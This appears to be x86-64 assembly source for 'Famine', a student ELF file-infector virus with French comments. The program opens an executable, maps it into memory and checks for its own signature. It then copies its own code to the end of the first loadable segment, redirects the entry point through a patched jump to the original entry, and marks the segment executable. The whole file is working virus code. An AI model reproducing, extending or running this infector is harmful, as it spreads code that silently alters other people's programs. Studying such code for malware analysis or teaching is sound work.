%define PROG_SIZE   _end - main
%define JMP_OFFSET  jump - main
%define SIGNATURE_SIZE _end - signature
%define O_WRONLY	1
%define O_RDWR      2
%define O_APPEND	02000
%define SEEK_END    2
%define PROT_READ   1
%define PROT_WRITE  2
%define MAP_SHARED  1
%define PT_LOAD	    1
%define PF_X        1

%define SYS_WRITE   1
%define SYS_OPEN    2
%define SYS_CLOSE   3
%define SYS_LSEEK   8
%define SYS_MMAP    9
%define SYS_MUNMAP  11
%define SYS_EXIT    60

struc   Elf64_Ehdr
    e_ident:     resb 16   ;       /* Magic number and other info */
    e_type:      resw 1    ;		/* Object file type */
    e_machine:   resw 1    ;		/* Architecture */
    e_version:   resd 1    ;		/* Object file version */
    e_entry:     resq 1    ;		/* Entry point virtual address */
    e_phoff:     resq 1    ;		/* Program header table file offset */
    e_shoff:     resq 1    ;		/* Section header table file offset */
    e_flags:     resd 1    ;		/* Processor-specific flags */
    e_ehsize:    resw 1    ;		/* ELF header size in bytes */
    e_phentsize: resw 1    ;		/* Program header table entry size */
    e_phnum:     resw 1    ;		/* Program header table entry count */
    e_shentsize: resw 1    ;		/* Section header table entry size */
    e_shnum:     resw 1    ;		/* Section header table entry count */
    e_shstrndx:  resw 1    ;		/* Section header string table index */
endstruc

struc Elf64_Phdr
    p_type:   resd 1 ;	    /* Segment type */
    p_flags:  resd 1 ;		/* Segment flags */
    p_offset: resq 1 ;		/* Segment file offset */
    p_vaddr:  resq 1 ;	    /* Segment virtual address */
    p_paddr:  resq 1 ;	    /* Segment physical address */
    p_filesz: resq 1 ;		/* Segment size in file */
    p_memsz:  resq 1 ;		/* Segment size in memory */
    p_align:  resq 1 ;		/* Segment alignment */
endstruc

struc famine
    fd:         resq 1
    fileSize:   resq 1
    fileData:   resq 1
    pload:      resq 1
    entry:      resq 1
    oldEntry:   resq 1
endstruc

 ;   lea r15, [rel jump + 1]
 ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text

global main
extern printf

main:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
    push rbx
    push rdx                        ;   push plus de registre car segv
    push rcx
    push rdi
    push rsi
    lea rdi, [rel ptest]
    mov rsi, rsp
    call infect_file

exit:
    mov rdi, 1
    lea rsi, [rel signature]
    mov rdx, SIGNATURE_SIZE
    mov rax, SYS_WRITE
    syscall
    mov qword [rsp + pload], 0
;    mov qword [rsp + fd], 0
;    mov qword [rsp + fileData], 0
;    mov qword [rsp + fileSize], 0
;    mov qword [rsp + entry], 0
;    mov qword [rsp + oldEntry], 0
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    pop rbx
    leave

    
jump:
    ret
    nop
    nop
    nop
    nop


; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rsi
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    js close_file
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    xor rsi, rsi
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    cmp rax, 0          ; if (size < 0) return ;
    jl close_file
;    cmp rax,                                                                                                     ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
    mov [r12 + fileSize], rax
    xor rdi, rdi
    mov rsi, [r12 + fileSize]
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    xor r9, r9
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz  close_file
    mov [r12 + fileData], rax   ; faire des check pour le format

check_signature:
    xor rdx, rdx
    mov rcx, [r12 + fileSize]
    sub rcx, SIGNATURE_SIZE
    lea rdi, [rel signature] 
    jmp check_signature_cmp
    check_signature_loop:
        mov rsi, [r12 + fileData]
        add rsi, rdx  
        call ft_strcmp
        cmp rax, 0
        jz close_mmap
        inc rdx
        
    check_signature_cmp:
    cmp rdx, rcx
    jl check_signature_loop
    
check_file_integrity:
    mov rax, [r12 + fileData]
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi
    

get_first_pload:
    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
    xor r14, r14                  ; mise a 0
    xor rdi, rdi
    mov di, [r13 + e_phnum]
    mov rsi, [r13 + e_phoff]
    xor rdx, rdx
    mov dx, [r13 + e_phentsize]
    xor rax, rax
phead_loop:
    mov eax, [r13 + rsi + p_type]
    cmp rax, PT_LOAD
    jz first_pload_found
    inc r14
    add rsi, rdx
    cmp r14, rdi
    jl phead_loop
    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
    add r13, rsi
    mov [r12 + pload], r13
    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
    mov [rsi + e_entry], rdi
copy_program:
    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
    add rdi, [r13 + p_filesz]
    lea rsi, [rel main]                     ; address du debut du programe
    mov rdx, PROG_SIZE                      ; taille du programe
    call ft_memcpy
    
    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    
    ; ecrit le jump a l'adress de jump
    mov [rdi + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
    mov [rdi + JMP_OFFSET + 1], ecx

    ; augmente la taille du premier pload
    add qword [r13 + p_memsz], PROG_SIZE
    add qword [r13 + p_filesz], PROG_SIZE
    
    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    
close_mmap:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)

close_file:
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
    ret


;  void *ft_memcpy(void *dest, void* src, size_t size)
ft_memcpy:
    xor rax, rax
    jmp ft_memcpy_cmp
    ft_memcpy_loop:
    mov bl, [rsi + rax]
    mov [rdi + rax], bl
    inc rax
    ft_memcpy_cmp:
    cmp rax, rdx
    jl ft_memcpy_loop
    mov rax, rdi
    ret

;  char ft_strcmp(char *str1, char* str2)
ft_strcmp:
    xor rax, rax
    xor rbx, rbx
    jmp ft_strcmp_cmp
    ft_strcmp_loop:
    mov bl, [rdi + rax]
    sub bl, [rsi + rax]
    cmp bl, 0
    jnz quit_ft_strcmp_loop
    inc rax
    ft_strcmp_cmp:
    cmp byte [rdi + rax], 0
    jnz ft_strcmp_loop
    quit_ft_strcmp_loop:
    mov bl, [rdi + rax]
    sub bl, [rsi + rax]
    mov rax, rbx
    ret

;  void append_signature(char *name)
append_signature:
    mov rsi, O_WRONLY | O_APPEND
    mov rax, SYS_OPEN
    syscall
    mov rdi, rax 
    lea rsi, [rel signature]
    mov rdx, SIGNATURE_SIZE
    mov rax, SYS_WRITE
    syscall
    mov rax, SYS_CLOSE
    syscall
    ret


firstDir: db "/tmp/test", 0
secondDir: db "/tmp/test2", 0
ptest: db "./ptest", 0
signature: db "Famine version 1.0 (c)oded by <mtaquet>-<matheme>", 0
_end:

